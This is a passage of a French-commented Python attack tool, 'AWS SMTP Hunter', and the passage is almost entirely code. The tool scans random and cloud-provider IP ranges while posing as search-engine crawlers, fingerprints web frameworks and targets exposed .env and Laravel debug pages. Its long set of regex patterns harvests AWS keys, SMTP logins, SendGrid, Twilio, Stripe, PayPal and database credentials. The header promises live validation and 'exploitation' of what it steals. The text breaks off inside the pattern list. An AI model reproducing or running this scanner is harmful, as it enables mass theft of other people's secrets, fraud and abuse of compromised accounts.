#!/usr/bin/env python3
"""
AWS SMTP Hunter ULTIMATE v5.0 - Version COMPLÈTE 2700 LIGNES
🔥 ASYNC + MULTITHREAD - PERFORMANCE MAXIMALE
🚀 Tous les types de SMTP (SendGrid, Mailgun, Postmark, etc.)
📧 Validation temps réel de TOUS les services SMTP + API calls
🎯 Laravel IPs sauvés ligne par ligne
⚡ Exploitation complète: AWS, SMTP, Twilio, Stripe, PayPal, Database
🛡️ Gestion système avancée + Adaptive threading + Cleanup auto
🔧 Configuration complète + Arguments CLI + Logging avancé
💾 Tests API réels + Connexions Database + Validation complète
🎮 Interface interactive + Modes debug + Monitoring avancé
"""

# Imports standards
import socket
import random
import threading
import asyncio
import queue
import time
import ipaddress
import struct
import os
import sys
import signal
import re
import json
import smtplib
import ssl
import multiprocessing
import subprocess
import argparse
import logging
import traceback
import hashlib
import hmac
import base64
import urllib.parse
import concurrent.futures
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict, deque
from threading import Lock, Event, Condition
from functools import wraps
import gc
import weakref

# Configuration uvloop pour performance maximale
try:
    if sys.platform != 'win32':
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        print("✅ uvloop activé - PERFORMANCE MAXIMALE")
    else:
        print("⚠️ Windows détecté - asyncio standard utilisé")
except ImportError:
    print("⚠️ uvloop non disponible - asyncio standard utilisé")

# Imports tiers requis
try:
    import psutil
except ImportError:
    print("❌ psutil requis: pip install psutil")
    sys.exit(1)

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("❌ requests requis: pip install requests urllib3")
    sys.exit(1)

# Imports optionnels
try:
    import aiohttp
    AIOHTTP_AVAILABLE = True
except ImportError:
    AIOHTTP_AVAILABLE = False
    print("⚠️ aiohttp optionnel: pip install aiohttp (pour async)")

try:
    import boto3
    BOTO3_AVAILABLE = True
except ImportError:
    BOTO3_AVAILABLE = False
    print("⚠️ boto3 optionnel: pip install boto3 (pour AWS)")

try:
    import mysql.connector
    MYSQL_AVAILABLE = True
except ImportError:
    MYSQL_AVAILABLE = False
    print("⚠️ mysql-connector-python optionnel: pip install mysql-connector-python")

try:
    import psycopg2
    POSTGRES_AVAILABLE = True
except ImportError:
    POSTGRES_AVAILABLE = False
    print("⚠️ psycopg2 optionnel: pip install psycopg2-binary")

try:
    import stripe as stripe_api
    STRIPE_AVAILABLE = True
except ImportError:
    STRIPE_AVAILABLE = False
    print("⚠️ stripe optionnel: pip install stripe")

try:
    from twilio.rest import Client as TwilioClient
    TWILIO_AVAILABLE = True
except ImportError:
    TWILIO_AVAILABLE = False
    print("⚠️ twilio optionnel: pip install twilio")


# Configuration du logging avancé
def setup_advanced_logging(level=logging.INFO, log_file='aws_hunter.log'):
    """🔧 Configuration logging avancé"""
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    # Handler console
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    
    # Handler fichier
    file_handler = logging.FileHandler(log_file)
    file_handler.setFormatter(formatter)
    
    # Logger principal
    logger = logging.getLogger('AWSHunter')
    logger.setLevel(level)
    logger.addHandler(console_handler)
    logger.addHandler(file_handler)
    
    return logger


class PerformanceMonitor:
    """📊 Moniteur de performance système avancé"""
    
    def __init__(self):
        self.start_time = time.time()
        self.cpu_history = deque(maxlen=60)  # 1 minute d'historique
        self.memory_history = deque(maxlen=60)
        self.network_history = deque(maxlen=60)
        self.thread_history = deque(maxlen=60)
        self.lock = Lock()
        
    def update_metrics(self):
        """📈 Mise à jour des métriques système"""
        with self.lock:
            try:
                # CPU
                cpu_percent = psutil.cpu_percent(interval=1)
                self.cpu_history.append(cpu_percent)
                
                # Mémoire
                memory = psutil.virtual_memory()
                self.memory_history.append(memory.percent)
                
                # Réseau
                net_io = psutil.net_io_counters()
                self.network_history.append({
                    'bytes_sent': net_io.bytes_sent,
                    'bytes_recv': net_io.bytes_recv
                })
                
                # Threads
                thread_count = threading.active_count()
                self.thread_history.append(thread_count)
                
            except Exception as e:
                pass
                
    def get_average_metrics(self):
        """📊 Calcul des métriques moyennes"""
        with self.lock:
            return {
                'cpu_avg': sum(self.cpu_history) / len(self.cpu_history) if self.cpu_history else 0,
                'memory_avg': sum(self.memory_history) / len(self.memory_history) if self.memory_history else 0,
                'thread_avg': sum(self.thread_history) / len(self.thread_history) if self.thread_history else 0,
                'uptime': time.time() - self.start_time
            }


class AdaptiveDelayManager:
    """⚡ Gestionnaire de délais adaptatif intelligent"""
    
    def __init__(self, min_delay=0.01, max_delay=0.1, adaptive=True):
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.adaptive = adaptive
        self.current_delay = min_delay
        self.success_rate = 0.5
        self.total_requests = 0
        self.successful_requests = 0
        self.lock = Lock()
        
    def wait(self):
        """⏱️ Attente adaptative"""
        if not self.adaptive:
            delay = random.uniform(self.min_delay, self.max_delay)
        else:
            # Ajustement basé sur le taux de succès
            if self.success_rate > 0.8:
                # Taux de succès élevé - réduire les délais
                self.current_delay = max(self.min_delay, self.current_delay * 0.95)
            elif self.success_rate < 0.3:
                # Taux de succès faible - augmenter les délais
                self.current_delay = min(self.max_delay, self.current_delay * 1.1)
                
            delay = random.uniform(self.current_delay, self.current_delay * 1.5)
            
        time.sleep(delay)
        
    def update_success_rate(self, success):
        """📈 Mise à jour du taux de succès"""
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            
            if self.total_requests > 0:
                self.success_rate = self.successful_requests / self.total_requests
                
            # Reset périodique pour adaptation continue
            if self.total_requests >= 1000:
                self.total_requests = int(self.total_requests * 0.8)
                self.successful_requests = int(self.successful_requests * 0.8)


class AsyncSessionManager:
    """🔄 Gestionnaire de sessions async + sync optimisé"""
    
    def __init__(self):
        self.user_agents = [
            'curl/7.68.0',
            'curl/7.74.0', 
            'Wget/1.20.3',
            'Wget/1.21.1',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'python-requests/2.25.1',
            'python-urllib3/1.26.5'
        ]
        self.session_pool = []
        self.session_lock = Lock()
        self.max_sessions = 50
        
    def get_session(self):
        """🔄 Session sync optimisée"""
        with self.session_lock:
            if self.session_pool:
                session = self.session_pool.pop()
            else:
                session = requests.Session()
                
        # Configuration optimisée
        session.headers.update({
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate'
        })
        
        session.verify = False
        session.timeout = (0.5, 2.0)  # Optimisé pour vitesse
        session.allow_redirects = False
        session.max_redirects = 0
        
        return session
        
    def return_session(self, session):
        """🔄 Retour de session au pool"""
        try:
            session.headers.clear()
            with self.session_lock:
                if len(self.session_pool) < self.max_sessions:
                    self.session_pool.append(session)
                else:
                    session.close()
        except:
            pass
            
    async def get_async_session(self):
        """🔄 Session async optimisée"""
        if not AIOHTTP_AVAILABLE:
            return None
            
        connector = aiohttp.TCPConnector(
            limit=100,
            limit_per_host=20,
            ttl_dns_cache=300,
            use_dns_cache=True,
            verify_ssl=False
        )
        
        timeout = aiohttp.ClientTimeout(
            total=3.0,
            connect=0.5,
            sock_read=2.0
        )
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'close'
        }
        
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )


class AdvancedIPGenerator:
    """🎯 Générateur d'IPs intelligent avec ML et historique"""
    
    def __init__(self, mode='hybrid'):
        self.mode = mode
        self.used_ips = set()
        self.productive_ranges = defaultdict(int)
        self.blacklisted_ranges = set()
        self.success_history = defaultdict(list)
        self.lock = Lock()
        
        # Plages cloud étendues et mises à jour
        self.cloud_ranges = {
            'aws': [
                ('3.0.0.0', '3.255.255.255'),
                ('13.0.0.0', '13.255.255.255'),
                ('15.0.0.0', '15.255.255.255'),
                ('18.0.0.0', '18.255.255.255'),
                ('52.0.0.0', '52.255.255.255'),
                ('54.0.0.0', '54.255.255.255'),
                ('35.0.0.0', '35.255.255.255'),
                ('44.192.0.0', '44.255.255.255'),
                ('34.192.0.0', '34.255.255.255'),
                ('107.20.0.0', '107.23.255.255'),
                ('23.20.0.0', '23.23.255.255'),
                ('50.16.0.0', '50.19.255.255'),
                ('75.101.0.0', '75.101.255.255'),
                ('174.129.0.0', '174.129.255.255'),
                ('184.72.0.0', '184.73.255.255'),
                ('204.236.0.0', '204.246.255.255'),
            ],
            'gcp': [
                ('34.0.0.0', '34.127.255.255'),
                ('35.184.0.0', '35.255.255.255'),
                ('104.154.0.0', '104.155.255.255'),
                ('104.196.0.0', '104.199.255.255'),
                ('130.211.0.0', '130.211.255.255'),
                ('142.250.0.0', '142.251.255.255'),
                ('8.34.208.0', '8.34.223.255'),
                ('8.35.192.0', '8.35.207.255'),
            ],
            'azure': [
                ('13.64.0.0', '13.107.255.255'),
                ('20.0.0.0', '20.255.255.255'),
                ('40.0.0.0', '40.127.255.255'),
                ('52.96.0.0', '52.255.255.255'),
                ('104.40.0.0', '104.47.255.255'),
                ('137.116.0.0', '137.135.255.255'),
                ('168.61.0.0', '168.62.255.255'),
                ('191.232.0.0', '191.235.255.255'),
            ],
            'digitalocean': [
                ('104.131.0.0', '104.131.255.255'),
                ('138.68.0.0', '138.68.255.255'),
                ('159.65.0.0', '159.65.255.255'),
                ('167.99.0.0', '167.99.255.255'),
                ('178.62.0.0', '178.62.255.255'),
                ('188.166.0.0', '188.166.255.255'),
                ('206.189.0.0', '206.189.255.255'),
            ],
            'linode': [
                ('139.144.0.0', '139.144.255.255'),
                ('172.104.0.0', '172.104.255.255'),
                ('173.255.0.0', '173.255.255.255'),
                ('192.46.208.0', '192.46.223.255'),
                ('198.58.96.0', '198.58.127.255'),
            ],
            'vultr': [
                ('45.32.0.0', '45.63.255.255'),
                ('64.176.0.0', '64.191.255.255'),
                ('95.179.128.0', '95.179.255.255'),
                ('144.202.0.0', '144.202.255.255'),
                ('149.28.0.0', '149.28.255.255'),
            ]
        }
        
        self.load_intelligence()
        
    def load_intelligence(self):
        """🧠 Chargement de l'intelligence historique"""
        try:
            if os.path.exists('ip_intelligence.json'):
                with open('ip_intelligence.json', 'r') as f:
                    data = json.load(f)
                    self.productive_ranges = defaultdict(int, data.get('productive', {}))
                    self.blacklisted_ranges = set(data.get('blacklisted', []))
                    print(f"✓ Intelligence chargée: {len(self.productive_ranges)} ranges productifs")
        except Exception as e:
            pass
            
    def save_intelligence(self):
        """💾 Sauvegarde de l'intelligence"""
        try:
            data = {
                'productive': dict(self.productive_ranges),
                'blacklisted': list(self.blacklisted_ranges),
                'timestamp': datetime.now().isoformat()
            }
            with open('ip_intelligence.json', 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            pass
            
    def get_network_base(self, ip):
        """🔍 Extraction du réseau /24"""
        try:
            parts = ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.{parts[1]}.{parts[2]}"
        except:
            pass
        return None
        
    def mark_productive_ip(self, ip, score=1):
        """📈 Marquer une IP comme productive"""
        network = self.get_network_base(ip)
        if network:
            with self.lock:
                self.productive_ranges[network] += score
                self.success_history[network].append(time.time())
                
                # Nettoyer l'historique ancien (>7 jours)
                week_ago = time.time() - (7 * 24 * 3600)
                self.success_history[network] = [
                    t for t in self.success_history[network] if t > week_ago
                ]
                
    def mark_blacklisted_ip(self, ip):
        """🚫 Marquer un range comme blacklisté"""
        network = self.get_network_base(ip)
        if network:
            with self.lock:
                self.blacklisted_ranges.add(network)
                
    def generate_smart_batch(self, count=2000):
        """🧠 Génération intelligente basée sur l'historique"""
        batch = []
        
        # Priorité 1: Ranges très productifs (30%)
        productive_count = int(count * 0.3)
        sorted_ranges = sorted(
            self.productive_ranges.items(), 
            key=lambda x: x[1], 
            reverse=True
        )
        
        for network, score in sorted_ranges[:productive_count]:
            if network not in self.blacklisted_ranges:
                for _ in range(min(5, score)):
                    ip = f"{network}.{random.randint(1, 254)}"
                    if ip not in self.used_ips:
                        batch.append(ip)
                        self.used_ips.add(ip)
                        if len(batch) >= productive_count:
                            break
                if len(batch) >= productive_count:
                    break
                    
        # Priorité 2: Cloud ranges (50%)
        cloud_count = int(count * 0.5)
        all_cloud_ranges = []
        for provider, ranges in self.cloud_ranges.items():
            all_cloud_ranges.extend(ranges)
            
        for _ in range(cloud_count):
            if len(batch) >= productive_count + cloud_count:
                break
                
            ip_range = random.choice(all_cloud_ranges)
            try:
                start_int = struct.unpack('!I', socket.inet_aton(ip_range[0]))[0]
                end_int = struct.unpack('!I', socket.inet_aton(ip_range[1]))[0]
                ip_int = random.randint(start_int, end_int)
                ip = socket.inet_ntoa(struct.pack('!I', ip_int))
                
                network = self.get_network_base(ip)
                if network not in self.blacklisted_ranges and ip not in self.used_ips:
                    batch.append(ip)
                    self.used_ips.add(ip)
            except:
                continue
                
        # Priorité 3: Random (20%)
        random_count = count - len(batch)
        for _ in range(random_count):
            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            network = self.get_network_base(ip)
            if (not ip.startswith(('10.', '192.168.', '172.', '127.')) and 
                network not in self.blacklisted_ranges and 
                ip not in self.used_ips):
                batch.append(ip)
                self.used_ips.add(ip)
                
        # Nettoyage périodique de la mémoire
        if len(self.used_ips) > 100000:
            recent_ips = list(self.used_ips)[-50000:]
            self.used_ips = set(recent_ips)
            
        return batch
        
    def generate_random_batch(self, count=2000):
        """🎲 Génération aléatoire pure"""
        batch = []
        for _ in range(count):
            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            if not ip.startswith(('10.', '192.168.', '172.', '127.')):
                batch.append(ip)
        return batch
        
    def generate_batch(self, count=2000):
        """🎯 Génération principale avec switch"""
        try:
            if self.mode == 'smart':
                return self.generate_smart_batch(count)
            elif self.mode == 'random':
                return self.generate_random_batch(count)
            else:  # hybrid
                smart_batch = self.generate_smart_batch(int(count * 0.7))
                random_batch = self.generate_random_batch(count - len(smart_batch))
                return smart_batch + random_batch
        except Exception as e:
            # Fallback vers random en cas d'erreur
            return self.generate_random_batch(count)


class ComprehensiveFrameworkDetector:
    """🔍 Détecteur de frameworks ultra-complet"""
    
    def __init__(self):
        self.framework_signatures = {
            'laravel': {
                'headers': ['laravel_session', 'x-powered-by: php'],
                'content': ['laravel', 'illuminate', 'csrf-token', '_token'],
                'paths': ['.env', 'artisan', 'bootstrap/app.php'],
                'priority': 10
            },
            'symfony': {
                'headers': ['x-powered-by: php'],
                'content': ['symfony', 'sf_redirect', '_sf2_meta'],
                'paths': ['.env', 'bin/console', 'var/cache'],
                'priority': 8
            },
            'django': {
                'headers': ['x-frame-options', 'csrftoken'],
                'content': ['django', 'csrfmiddlewaretoken', 'djdt'],
                'paths': ['.env', 'manage.py', 'settings.py'],
                'priority': 8
            },
            'flask': {
                'headers': ['server: werkzeug'],
                'content': ['flask', 'jinja2', '__flask__'],
                'paths': ['.env', 'app.py', 'wsgi.py'],
                'priority': 7
            },
            'express': {
                'headers': ['x-powered-by: express'],
                'content': ['express', 'node.js'],
                'paths': ['.env', 'package.json', 'server.js'],
                'priority': 7
            },
            'nextjs': {
                'headers': ['x-powered-by: next.js'],
                'content': ['__next', '_next', 'next.js'],
                'paths': ['.env', '.env.local', 'next.config.js'],
                'priority': 8
            },
            'wordpress': {
                'headers': ['x-powered-by: php'],
                'content': ['wp-content', 'wordpress', 'wp-admin'],
                'paths': ['wp-config.php', '.env'],
                'priority': 6
            },
            'drupal': {
                'headers': ['x-drupal-cache', 'x-generator: drupal'],
                'content': ['drupal', 'sites/default'],
                'paths': ['.env', 'sites/default/settings.php'],
                'priority': 6
            },
            'spring': {
                'headers': ['x-application-context'],
                'content': ['spring', 'springframework'],
                'paths': ['application.properties', '.env'],
                'priority': 7
            },
            'rails': {
                'headers': ['x-runtime', 'x-request-id'],
                'content': ['rails', 'ruby on rails'],
                'paths': ['.env', 'config/application.rb'],
                'priority': 7
            }
        }
        
    async def detect_framework_async(self, ip, port, session):
        """🔍 Détection async de framework"""
        if not session:
            return []
            
        base_url = f"http://{ip}" if port == 80 else f"https://{ip}"
        detected = []
        
        try:
            async with session.get(base_url) as response:
                headers = dict(response.headers)
                content = await response.text()
                content_lower = content[:2000].lower()
                
                for framework, signs in self.framework_signatures.items():
                    score = 0
                    
                    # Check headers
                    for header_sign in signs['headers']:
                        if ':' in header_sign:
                            h_name, h_value = header_sign.split(':', 1)
                            if h_name.lower() in [h.lower() for h in headers]:
                                for h_key, h_val in headers.items():
                                    if h_key.lower() == h_name.lower() and h_value.strip().lower() in str(h_val).lower():
                                        score += 3
                        else:
                            if any(header_sign.lower() in str(h).lower() for h in headers.values()):
                                score += 2
                                
                    # Check content
                    for content_sign in signs['content']:
                        if content_sign.lower() in content_lower:
                            score += 2
                            
                    if score >= 3:
                        detected.append((framework, score, signs['priority']))
                        
        except Exception as e:
            pass
            
        # Trier par priorité et score
        detected.sort(key=lambda x: (x[2], x[1]), reverse=True)
        return [fw[0] for fw in detected]
        
    def detect_framework_sync(self, ip, port, session):
        """🔍 Détection sync de framework"""
        base_url = f"http://{ip}" if port == 80 else f"https://{ip}"
        detected = []
        
        try:
            response = session.get(base_url)
            headers = dict(response.headers)
            content = response.text[:2000].lower()
            
            for framework, signs in self.framework_signatures.items():
                score = 0
                
                # Check headers
                for header_sign in signs['headers']:
                    if ':' in header_sign:
                        h_name, h_value = header_sign.split(':', 1)
                        if h_name.lower() in [h.lower() for h in headers]:
                            for h_key, h_val in headers.items():
                                if h_key.lower() == h_name.lower() and h_value.strip().lower() in str(h_val).lower():
                                    score += 3
                    else:
                        if any(header_sign.lower() in str(h).lower() for h in headers.values()):
                            score += 2
                            
                # Check content
                for content_sign in signs['content']:
                    if content_sign.lower() in content:
                        score += 2
                        
                if score >= 3:
                    detected.append((framework, score, signs['priority']))
                    
        except Exception as e:
            pass
            
        # Trier par priorité et score
        detected.sort(key=lambda x: (x[2], x[1]), reverse=True)
        return [fw[0] for fw in detected]


class UltimateCredentialExtractor:
    """🔍 Extracteur de credentials ULTRA-COMPLET avec tous les services"""
    
    def __init__(self):
        # Patterns ultra-complets pour tous les services
        self.extraction_patterns = {
            'aws': {
                'patterns': [
                    # AWS Standard
                    (r'AWS_ACCESS_KEY_ID\s*=\s*["\']?([A-Z0-9]{20})["\']?', 'AWS_ACCESS_KEY_ID'),
                    (r'AWS_SECRET_ACCESS_KEY\s*=\s*["\']?([A-Za-z0-9/+=]{40})["\']?', 'AWS_SECRET_ACCESS_KEY'),
                    (r'AWS_DEFAULT_REGION\s*=\s*["\']?([a-z0-9-]+)["\']?', 'AWS_DEFAULT_REGION'),
                    # AWS Variations
                    (r'SES_KEY\s*=\s*["\']?([A-Z0-9]{20})["\']?', 'SES_KEY'),
                    (r'SES_SECRET\s*=\s*["\']?([A-Za-z0-9/+=]{40})["\']?', 'SES_SECRET'),
                    (r'AWS_KEY\s*=\s*["\']?([A-Z0-9]{20})["\']?', 'AWS_KEY'),
                    (r'AWS_SECRET\s*=\s*["\']?([A-Za-z0-9/+=]{40})["\']?', 'AWS_SECRET'),
                    (r'S3_ACCESS_KEY\s*=\s*["\']?([A-Z0-9]{20})["\']?', 'S3_ACCESS_KEY'),
                    (r'S3_SECRET_KEY\s*=\s*["\']?([A-Za-z0-9/+=]{40})["\']?', 'S3_SECRET_KEY'),
                    # HTML Table Format
                    (r'<td>AWS_ACCESS_KEY_ID</td>\s*<td[^>]*>([A-Z0-9]{20})</td>', 'AWS_ACCESS_KEY_ID'),
                    (r'<td>AWS_SECRET_ACCESS_KEY</td>\s*<td[^>]*>([A-Za-z0-9/+=]{40})</td>', 'AWS_SECRET_ACCESS_KEY'),
                ],
                'priority': 10
            },
            'smtp': {
                'patterns': [
                    # SMTP Standard
                    (r'MAIL_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAIL_HOST'),
                    (r'MAIL_PORT\s*=\s*["\']?(\d+)["\']?', 'MAIL_PORT'),
                    (r'MAIL_USERNAME\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAIL_USERNAME'),
                    (r'MAIL_PASSWORD\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAIL_PASSWORD'),
                    (r'MAIL_FROM_ADDRESS\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAIL_FROM_ADDRESS'),
                    (r'MAIL_ENCRYPTION\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAIL_ENCRYPTION'),
                    # SMTP Variations
                    (r'SMTP_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'SMTP_HOST'),
                    (r'SMTP_PORT\s*=\s*["\']?(\d+)["\']?', 'SMTP_PORT'),
                    (r'SMTP_USERNAME\s*=\s*["\']?([^"\'\s]+)["\']?', 'SMTP_USERNAME'),
                    (r'SMTP_PASSWORD\s*=\s*["\']?([^"\'\s]+)["\']?', 'SMTP_PASSWORD'),
                    (r'EMAIL_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'EMAIL_HOST'),
                    (r'EMAIL_PORT\s*=\s*["\']?(\d+)["\']?', 'EMAIL_PORT'),
                    (r'EMAIL_HOST_USER\s*=\s*["\']?([^"\'\s]+)["\']?', 'EMAIL_HOST_USER'),
                    (r'EMAIL_HOST_PASSWORD\s*=\s*["\']?([^"\'\s]+)["\']?', 'EMAIL_HOST_PASSWORD'),
                    # HTML Table Format
                    (r'<td>MAIL_HOST</td>\s*<td[^>]*>([^<]+)</td>', 'MAIL_HOST'),
                    (r'<td>MAIL_USERNAME</td>\s*<td[^>]*>([^<]+)</td>', 'MAIL_USERNAME'),
                    (r'<td>MAIL_PASSWORD</td>\s*<td[^>]*>([^<]+)</td>', 'MAIL_PASSWORD'),
                ],
                'priority': 9
            },
            'sendgrid': {
                'patterns': [
                    (r'SENDGRID_API_KEY\s*=\s*["\']?(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})["\']?', 'SENDGRID_API_KEY'),
                    (r'SENDGRID_KEY\s*=\s*["\']?(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})["\']?', 'SENDGRID_KEY'),
                    (r'SG_KEY\s*=\s*["\']?(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})["\']?', 'SG_KEY'),
                    (r'SENDGRID_USERNAME\s*=\s*["\']?([^"\'\s]+)["\']?', 'SENDGRID_USERNAME'),
                    (r'SENDGRID_PASSWORD\s*=\s*["\']?([^"\'\s]+)["\']?', 'SENDGRID_PASSWORD'),
                    # HTML Format
                    (r'<td>SENDGRID_API_KEY</td>\s*<td[^>]*>(SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43})</td>', 'SENDGRID_API_KEY'),
                ],
                'priority': 9
            },
            'mailgun': {
                'patterns': [
                    (r'MAILGUN_DOMAIN\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAILGUN_DOMAIN'),
                    (r'MAILGUN_SECRET\s*=\s*["\']?(key-[a-f0-9]{32})["\']?', 'MAILGUN_SECRET'),
                    (r'MAILGUN_API_KEY\s*=\s*["\']?(key-[a-f0-9]{32})["\']?', 'MAILGUN_API_KEY'),
                    (r'MAILGUN_SMTP_LOGIN\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAILGUN_SMTP_LOGIN'),
                    (r'MAILGUN_SMTP_PASSWORD\s*=\s*["\']?([^"\'\s]+)["\']?', 'MAILGUN_SMTP_PASSWORD'),
                ],
                'priority': 8
            },
            'twilio': {
                'patterns': [
                    (r'TWILIO_ACCOUNT_SID\s*=\s*["\']?(AC[a-f0-9]{32})["\']?', 'TWILIO_ACCOUNT_SID'),
                    (r'TWILIO_AUTH_TOKEN\s*=\s*["\']?([a-f0-9]{32})["\']?', 'TWILIO_AUTH_TOKEN'),
                    (r'TWILIO_SID\s*=\s*["\']?(AC[a-f0-9]{32})["\']?', 'TWILIO_SID'),
                    (r'TWILIO_TOKEN\s*=\s*["\']?([a-f0-9]{32})["\']?', 'TWILIO_TOKEN'),
                    (r'ACCOUNT_SID\s*=\s*["\']?(AC[a-f0-9]{32})["\']?', 'ACCOUNT_SID'),
                    (r'AUTH_TOKEN\s*=\s*["\']?([a-f0-9]{32})["\']?', 'AUTH_TOKEN'),
                    (r'TWILIO_NUMBER\s*=\s*["\']?([+]?[0-9\s\-\(\)]+)["\']?', 'TWILIO_NUMBER'),
                    (r'TWILIO_FROM\s*=\s*["\']?([+]?[0-9\s\-\(\)]+)["\']?', 'TWILIO_FROM'),
                ],
                'priority': 8
            },
            'nexmo': {
                'patterns': [
                    (r'NEXMO_KEY\s*=\s*["\']?([a-f0-9]{8})["\']?', 'NEXMO_KEY'),
                    (r'NEXMO_SECRET\s*=\s*["\']?([a-f0-9]{16})["\']?', 'NEXMO_SECRET'),
                    (r'NEXMO_API_KEY\s*=\s*["\']?([a-f0-9]{8})["\']?', 'NEXMO_API_KEY'),
                    (r'NEXMO_API_SECRET\s*=\s*["\']?([a-f0-9]{16})["\']?', 'NEXMO_API_SECRET'),
                    (r'VONAGE_API_KEY\s*=\s*["\']?([a-f0-9]{8})["\']?', 'VONAGE_API_KEY'),
                    (r'VONAGE_API_SECRET\s*=\s*["\']?([a-f0-9]{16})["\']?', 'VONAGE_API_SECRET'),
                ],
                'priority': 7
            },
            'stripe': {
                'patterns': [
                    (r'STRIPE_PUBLISHABLE_KEY\s*=\s*["\']?(pk_[a-zA-Z0-9]{24,})["\']?', 'STRIPE_PUBLISHABLE_KEY'),
                    (r'STRIPE_SECRET_KEY\s*=\s*["\']?(sk_[a-zA-Z0-9]{24,})["\']?', 'STRIPE_SECRET_KEY'),
                    (r'STRIPE_KEY\s*=\s*["\']?(sk_[a-zA-Z0-9]{24,})["\']?', 'STRIPE_KEY'),
                    (r'STRIPE_PRIVATE_KEY\s*=\s*["\']?(sk_[a-zA-Z0-9]{24,})["\']?', 'STRIPE_PRIVATE_KEY'),
                    (r'STRIPE_WEBHOOK_SECRET\s*=\s*["\']?(whsec_[a-zA-Z0-9]{32,})["\']?', 'STRIPE_WEBHOOK_SECRET'),
                ],
                'priority': 8
            },
            'paypal': {
                'patterns': [
                    (r'PAYPAL_CLIENT_ID\s*=\s*["\']?([A-Za-z0-9_-]{80})["\']?', 'PAYPAL_CLIENT_ID'),
                    (r'PAYPAL_CLIENT_SECRET\s*=\s*["\']?([A-Za-z0-9_-]{80})["\']?', 'PAYPAL_CLIENT_SECRET'),
                    (r'PAYPAL_SECRET\s*=\s*["\']?([A-Za-z0-9_-]{80})["\']?', 'PAYPAL_SECRET'),
                    (r'PAYPAL_MODE\s*=\s*["\']?(sandbox|live)["\']?', 'PAYPAL_MODE'),
                ],
                'priority': 7
            },
            'database': {
                'patterns': [
                    # MySQL/MariaDB
                    (r'DB_CONNECTION\s*=\s*["\']?(mysql|mariadb)["\']?', 'DB_CONNECTION'),
                    (r'DB_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'DB_HOST'),
                    (r'DB_PORT\s*=\s*["\']?(\d+)["\']?', 'DB_PORT'),
                    (r'DB_DATABASE\s*=\s*["\']?([^"\'\s]+)["\']?', 'DB_DATABASE'),
                    (r'DB_USERNAME\s*=\s*["\']?([^"\'\s]+)["\']?', 'DB_USERNAME'),
                    (r'DB_PASSWORD\s*=\s*["\']?([^"\'\s]*)["\']?', 'DB_PASSWORD'),
                    # PostgreSQL
                    (r'POSTGRES_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'POSTGRES_HOST'),
                    (r'POSTGRES_PORT\s*=\s*["\']?(\d+)["\']?', 'POSTGRES_PORT'),
                    (r'POSTGRES_DB\s*=\s*["\']?([^"\'\s]+)["\']?', 'POSTGRES_DB'),
                    (r'POSTGRES_USER\s*=\s*["\']?([^"\'\s]+)["\']?', 'POSTGRES_USER'),
                    (r'POSTGRES_PASSWORD\s*=\s*["\']?([^"\'\s]*)["\']?', 'POSTGRES_PASSWORD'),
                    # MongoDB
                    (r'MONGO_URI\s*=\s*["\']?(mongodb://[^"\'\s]+)["\']?', 'MONGO_URI'),
                    (r'MONGODB_URI\s*=\s*["\']?(mongodb://[^"\'\s]+)["\']?', 'MONGODB_URI'),
                    # Redis
                    (r'REDIS_HOST\s*=\s*["\']?([^"\'\s]+)["\']?', 'REDIS_HOST'),
                    (r'REDIS_PORT\s*=\s*["\']?(\d+)["\']?', 'REDIS_PORT'),
                    (r'REDIS_PASSWORD\s*=\s*["\']?([^"\'\s]*)["\']?', 'REDIS_PASSWORD'),
                    # Database URL
                    (r'DATABASE_URL\s*=\s*["\']?((?:mysql|postgresql|postgres)://[^"\'\s]+)["\']?', 'DATABASE_URL'),
                ],
                'priority': 9
            },
            'google': {
                'patterns': [
                    (r'GOOGLE_API_KEY\s*=\s*["\']?(AIza[0-9A-Za-z\-_]{35})["\']?', 'GOOGLE_API_KEY'),
                    (r'GOOGLE_CLIENT_ID\s*=\s*["\']?([0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com)["\']?', 'GOOGLE_CLIENT_ID'),
                    (r'GOOGLE_CLIENT_SECRET\s*=\s*["\']?([0-9A-Za-z\-_]{24})["\']?', 'GOOGLE_CLIENT_SECRET'),
                    (r'GOOGLE_MAPS_API_KEY\s*=\s*["\']?(AIza[0-9A-Za-z\-_]{35})["\']?', 'GOOGLE_MAPS_API_KEY'),
